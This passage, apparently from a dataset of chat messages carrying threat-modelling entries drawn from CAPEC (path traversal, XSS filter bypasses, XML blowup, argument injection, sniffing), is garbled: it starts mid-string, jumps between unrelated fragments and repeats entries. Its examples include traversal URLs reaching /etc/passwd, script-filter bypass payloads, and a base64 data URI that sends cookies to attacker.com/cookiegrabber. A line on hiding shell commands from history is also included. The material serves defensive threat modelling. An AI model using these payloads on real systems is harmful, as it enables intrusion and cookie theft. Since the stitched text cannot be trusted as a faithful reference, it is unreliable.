interaction.\n\"references\" https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html\n\"severity\" Medium\n\"target\" [\nDataflow\n]\n"},{"role":"user","content":"### Threat\n## ID: 12\n## NAME: Choosing Message Identifier\n## Likelihood: High\n## Severity: High\n## Description\nThis pattern of attack is defined by the selection of messages distributed via multicast or public information channels that are intended for another client by determining the parameter value assigned to that client.

An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or ) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.\n\"example\" The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page.

A typical variety of this attack involves specifying a path to a desired file together with dot-dot-slash characters, resulting in the file access API or function traversing out of the intended directory structure and into the root file system. By replacing or modifying the expected path information the access function or API retrieves the file desired by the attacker. These attacks either involve the attacker providing a complete path to a targeted file or using control characters (e.g. path separators (/ or ) and/or dots (.)) to reach desired directories or files.\n\"example\" An example of using path traversal to attack some set of resources on a web server is to use a standard HTTP request http://example/../../../../../etc/passwd From an attacker point of view, this may be sufficient to gain access to the password file on a poorly protected system. If the attacker can list directories of critical resources then read only access is not sufficient to protect the system.\n\"mitigations\" Design: Configure the access control correctly. Design: Enforce principle of least privilege. Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution. Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host. 6. Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands. Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications. Implementation: Validate user input by only accepting known good.

The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the adversary and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.\n\"example\" PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs. [R.23.2]\n\"mitigations\" Design: Enforce principle of least privilegeDesign: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities.

Having done so, the Attacker may not only likely access functionality the system's designer didn't intend for them, but they may also go undetected or deny other users essential service in a catastrophic (or insidiously subtle) way.\n\"example\" Attacker targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread. The Attacker could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.\n\"mitigations\" Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.\n\"prerequisites\" The application in question employs a threaded model of execution with the threads operating at, or having the ability to switch to, a higher privilege level than normal usersIn order to feasibly execute this class of attacks, the attacker must have the ability to hijack a privileged thread.This ability includes, but is not limited to, modifying environment variables that affect the process the thread belongs to, or providing malformed user-controllable input that causes the executing thread to fault and return to a higher privilege level or such.This does not preclude network-based attacks, but makes them conceptually more difficult to identify and execute.\n\"references\" https://capec.mitre.org/data/definitions/236.html, http://cwe.mitre.org/data/definitions/270.html\n\"severity\" Very High\n\"target\" [\nProcess\n]\n"},{"role":"user","content":"### Threat\n## ID: 27\n## NAME: Leveraging Race Conditions via Symbolic Links\n## Likelihood: Medium\n## Severity: High\n## Description\nThis attack leverages the use of symbolic links (Symlinks) in order to write to sensitive files.

An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or ) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.\\nThe attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker.\\n\\n### Threat: Using Malicious Files\\nAn attack of this type exploits a system's configuration that allows an attacker to either directly access an executable file, for example through shell access; or in a possible worst case allows an attacker to upload a file and then execute it.

The attacker crafts an XML document with many attributes in the same XML node. In a vulnerable parser, this results in a denial of service condition owhere CPU resources are exhausted because of the parsing algorithm.\n\"example\" In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). \u003c?xml version=1.0?\u003e\u003cfooaaa=ZZZ=...999=/\u003e A document with n attributes results in (n^2)/2 operations to be performed.

For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the script tag using the alternate forms of Script or ScRiPt may bypass filters where script is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.\n\"example\" In this example, the attacker tries to get a script executed by the victim's browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An attacker will then create a special payload to bypass this filter: \u003cscriscriptpt\u003ealert(1)\u003c/scscriptript\u003e when the applications gets this input string, it will replace all script (case insensitive) by the empty string and the resulting input will be the desired vector by the attacker. In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., \u003cscript\u003eHERE\u003c/script\u003e). For the attacker to execute the same payload as in the previous example, he would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter ((w+)s*(.*)|alert|eval|function|document) and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string alert would be stripped. An attacker will then create a special payload to bypass this filter: this['al' + 'ert'](1) when the applications gets this input string, it won't replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The attacker could also have used non-alphanumeric XSS vectors to bypass the filter; for example, ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_) would be executed by the JavaScript engine like alert(1) is.\n\"mitigations\" Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcementImplementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software.

XML Routing Detour Attacks are Man in the Middle type attacks. The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of his or her choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.\n\"example\" Here is an example SOAP call from a client, example1.com, to a target, example4.com, via 2 intermediaries, example2.com and example3.com. (note: The client here is not necessarily a 'end user client' but rather the starting point of the XML transaction).

As with all remote attacks, it is important to differentiate the ability to launch an attack (such as probing an internal network for unpatched servers) and the ability of the remote attacker to collect and interpret the output of said attack.\n\"example\" An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. A malicious user embeds JavaScript in the IMG tags in his messages that gets executed within the victim's browser whenever the victim reads these messages. \u003cimg src=javascript:alert('XSS')\u003e When executed within the victim's browser, the malicious script could accomplish a number of adversary objectives including stealing sensitive information such as usernames, passwords, or cookies.\n\"mitigations\" In addition to the traditional input fields, all other user controllable inputs, such as image tags within messages or the likes, must also be subjected to input validation. Such validation should ensure that content that can be potentially interpreted as script by the browser is appropriately filtered.All output displayed to clients must be properly escaped. Escaping ensures that the browser interprets special scripting characters literally and not as script to be executed.\n\"prerequisites\" The target client software must allow the execution of scripts generated by remote hosts.\n\"references\" https://capec.mitre.org/data/definitions/18.html, http://cwe.mitre.org/data/definitions/80.html\n\"severity\" Very High\n\"target\" [\nServer\n]\n"},{"role":"user","content":"### Threat\n## ID: 5\n## NAME: Blue Boxing\n## Likelihood: Medium\n## Severity: Very High\n## Description\n{\"xhtml:p\":[\"This type of attack against older telephone switches and trunks has been around for decades.

Insert gaps into the database where there is a strong reason to add a new item to the threat database.

White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution.\\nAttacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), configuration files, or other system files.\\n\\n### Threat: XML Attribute Blowup\\nThis attack exploits certain XML parsers which manage data in an inefficient manner. The attacker crafts an XML document with many attributes in the same XML node. In a vulnerable parser, this results in a denial of service condition owhere CPU resources are exhausted because of the parsing algorithm.\\nIn this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). \\u003c?xml version=1.0?\\u003e\\u003cfooaaa=ZZZ=...999=/\\u003e A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.\\n\\n### Threat: XSS Using Alternate Syntax\\nAn adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the script tag using the alternate forms of Script or ScRiPt may bypass filters where script is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.\\nIn this example, the attacker tries to get a script executed by the victim's browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An attacker will then create a special payload to bypass this filter: \\u003cscriscriptpt\\u003ealert(1)\\u003c/scscriptript\\u003e when the applications gets this input string, it will replace all script (case insensitive) by the empty string and the resulting input will be the desired vector by the attacker. In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., \\u003cscript\\u003eHERE\\u003c/script\\u003e). For the attacker to execute the same payload as in the previous example, he would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter ((w+)s*(.*)|alert|eval|function|document) and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string alert would be stripped. An attacker will then create a special payload to bypass this filter: this['al' + 'ert'](1) when the applications gets this input string, it won't replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The attacker could also have used non-alphanumeric XSS vectors to bypass the filter; for example, ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_) would be executed by the JavaScript engine like alert(1) is.\\n\\n### Threat: XML Routing Detour Attacks\\nAn attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Man in the Middle type attacks. The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of his or her choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.\\nHere is an example SOAP call from a client, example1.com, to a target, example4.com, via 2 intermediaries, example2.com and example3.com.

This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.\n\"example\" Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.\n\"mitigations\" Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.\n\"prerequisites\" The target must transmit data over a medium that is accessible to the adversary.\n\"references\" https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html\n\"severity\" Medium\n\"target\" [\nDataflow\n]\n\n### Example\n\"Likelihood Of Attack\" High\n\"condition\" target.controls.validatesInput is False or target.controls.sanitizesInput is False\n\"description\" Argument Injection\n\"details\" An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.\n\"example\" A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [R.6.2]\n\"mitigations\" Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise.\n\"prerequisites\" Target software fails to strip all user-supplied input of any content that could cause the shell to perform unexpected actions.Software must allow for unvalidated or unfiltered input to be executed on operating system shell, and, optionally, the system configuration must allow for output to be sent back to client.\n\"references\" https://capec.mitre.org/data/definitions/6.html\n\"severity\" High\n\"target\" [\nProcess\n]\n\n### Example\n\"Likelihood Of Attack\" Medium\n\"condition\" target.implementsAPI is True and (target.controls.validatesInput is False or target.controls.sanitizesInput is False)\n\"description\" API Manipulation\n\"details\" An adversary manipulates the use or processing of an Application Programming Interface (API) resulting in an adverse impact upon the security of the system implementing the API. This can allow the adversary to execute functionality not intended by the API implementation, possibly compromising the system which integrates the API. API manipulation can take on a number of forms including forcing the unexpected use of an API, or the use of an API in an unintended way. For example, an adversary may make a request to an application that leverages a non-standard API that is known to incorrectly validate its data and thus it may be manipulated by supplying metacharacters or alternate encodings as input, resulting in any number of injection flaws, including SQL injection, cross-site scripting, or command execution. Another example could be API methods that should be disabled in a production application but were not, thus exposing dangerous functionality within a production environment.\n\"example\" Since APIs can be accessed over the internet just like any other URI with some sensitive data attached to the request, they share the vulnerabilities of any other resource accessible on the internet like Man-in-the-middle, CSRF Attack, Denial of Services, etc.\n\"mitigations\" Always use HTTPS and SSL Certificates. Firewall optimizations to prevent unauthorized access to or from a private network. Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API. Use IP whitelisting and rate limiting.\n\"prerequisites\" The target system must expose API functionality in a manner that can be discovered and manipulated by an adversary. This may require reverse engineering the API syntax or decrypting/de-obfuscating client-server exchanges.\n\"references\" https://capec.mitre.org/data/definitions/113.html, http://cwe.mitre.org/data/definitions/227.html\n\"severity\" Medium\n\"target\" [\nProcessLambda\n]\n\n### Example\n\"Likelihood Of Attack\" \n\"condition\" (target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False\n\"description\" Sniffing Attacks\n\"details\" In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.\n\"example\" Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.\n\"mitigations\" Encrypt sensitive information when transmitted on insecure mediums to prevent interception.\n\"prerequisites\" The target data stream must be transmitted on a medium to which the adversary has access.\n\"references\" https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html\n\"severity\" Medium\n\"target\" [\nDataflow\n]\n\n### Example\n\"Likelihood Of Attack\" High\n\"condition\" target.usesEnvironmentVariables is True and (target.controls.implementsAuthenticationScheme is False or target.controls.validatesInput is False or target.controls.authorizesSource is False)\n\"description\" Subverting Environment Variable Values\n\"details\" The attacker directly or indirectly modifies environment variables used by or controlling the target software. The attacker's goal is to cause the target software to deviate from its expected operation in a manner that benefits the attacker.\n\"example\" Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the attacker upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as 172.16.2.100shared_filestrojan_dll.dll. See also: Path Manipulation (CVE-1999-0073). The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to ignorespace. HISTCONTROL can also be set to ignore duplicate commands by setting it to ignoredups. In some Linux systems, this is set by default to ignoreboth which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.\n\"mitigations\" Protect environment variables against unauthorized read and write access. Protect the configuration files which contain environment variables against illegitimate read and write access. Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Apply the least privilege principles. If a process has no legitimate reason to read an environment variable do not give that privilege.\n\"prerequisites\" An environment variable is accessible to the user.An environment variable used by the application can be tainted with user supplied data.Input data used in an environment variable is not validated properly.The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an attacker may attempt to manipulate that variable.\n\"references\" https://capec.mitre.org/data/definitions/13.html, http://cwe.mitre.org/data/definitions/353.html, http://cwe.mitre.org/data/definitions/15.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/302.html\n\"severity\" Very High\n\"target\" [\nProcessLambda\n]\n"},{"role":"user","content":"### Threat\n## ID: 499\n## NAME: Android Intent Intercept\n## Likelihood: \u003cno value\u003e\n## Severity: \u003cno value\u003e\n## Description\nAn adversary, through a previously installed malicious application, intercepts messages from a trusted Android-based application in an attempt to achieve a variety of different objectives including denial of service, information disclosure, and data injection.

Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.\n\"example\" Consider a directory on a web server with the following permissions drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot This could allow an attacker to both execute and upload and execute programs' on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit.\n\"mitigations\" Design: Enforce principle of least privilegeDesign: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.\n\"prerequisites\" System's configuration must allow an attacker to directly access executable files or upload files to execute.

The system functionality is not altered or modified but used in a way that was not intended. This is often accomplished through the overuse of a specific functionality or by leveraging functionality with design flaws that enables the adversary to gain access to unauthorized, sensitive data.\n\"example\" An attacker clicks on the 'forgot password' and is presented with a single security question.

The attacker's goal is to cause the target software to deviate from its expected operation in a manner that benefits the attacker.\n\"example\" Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the attacker upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as 172.16.2.100shared_filestrojan_dll.dll.

The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to ignorespace. HISTCONTROL can also be set to ignore duplicate commands by setting it to ignoredups.

This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.\n\"example\" Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.\n\"mitigations\" Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.

Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the \u003c before a script command, (\u003c\u003cscript or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.\n\"example\" By doubling the \u003c before a script command, (\u003c\u003cscript or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag.

An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or ) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.\n\"example\" The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker.\n\"mitigations\" Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach. Implementation: Prefer working without user input when using file system calls. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications.\n\"prerequisites\" The target application must accept a string as user input, fail to sanitize combinations of characters in the input that have a special meaning in the context of path navigation, and insert the user-supplied string into path navigation commands.\n\"references\" https://capec.mitre.org/data/definitions/139.html, http://cwe.mitre.org/data/definitions/23.html\n\"severity\" High\n\"target\" [\nServer\n]\n\n### Example\n\"Likelihood Of Attack\" High\n\"condition\" target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False\n\"description\" XSS Targeting URI Placeholders\n\"details\" An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.\n\"example\" The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: \u003chtml\u003e\u003cbody\u003e\u003cscript\u003evar img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): \u003ca href=INJECTION_POINT\u003eMy Link\u003c/a\u003e Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.\n\"mitigations\" Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcement.Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.\n\"prerequisites\" Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme.\n\"references\" https://capec.mitre.org/data/definitions/244.html, http://cwe.mitre.org/data/definitions/83.html\n\"severity\" High\n\"target\" [\nServerProcess\n]\n\n### Example\n\"Likelihood Of Attack\" Medium\n\"condition\" target.controls.validatesInput is False\n\"description\" Parameter Injection\n\"details\" An adversary manipulates the content of request parameters for the purpose of undermining the security of the target. Some parameter encodings use text characters as separators. For example, parameters in a HTTP GET message are encoded as name-value pairs separated by an ampersand (\u0026). If an attacker can supply text strings that are used to fill in these parameters, then they can inject special characters used in the encoding scheme to add or modify parameters. For example, if user input is fed directly into an HTTP GET request and the user provides the value myInput\u0026new_param=myValue, then the input parameter is set to myInput, but a new parameter (new_param) is also added with a value of myValue. This can significantly change the meaning of the query that is processed by the server. Any encoding scheme where parameters are identified and separated by text characters is potentially vulnerable to this attack - the HTTP GET encoding used above is just one example.\n\"example\" The target application accepts a string as user input, fails to sanitize characters that have a special meaning in the parameter encoding, and inserts the user-supplied string in an encoding which is then processed.\n\"mitigations\" Implement an audit log written to a separate host. In the event of a compromise, the audit log may be able to provide evidence and details of the compromise. Treat all user input as untrusted data that must be validated before use.\n\"prerequisites\" The target application must use a parameter encoding where separators and parameter identifiers are expressed in regular text.The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.\n\"references\" https://capec.mitre.org/data/definitions/137.html, http://cwe.mitre.org/data/definitions/88.html\n\"severity\" Medium\n\"target\" [\nServer\n]\n"},{"role":"user","content":"### Threat\n## ID: 64\n## NAME: Using Slashes and URL Encoding Combined to Bypass Validation Logic\n## Likelihood: High\n## Severity: High\n## Description\nThis attack targets the encoding of the URL combined with the encoding of the slash characters.
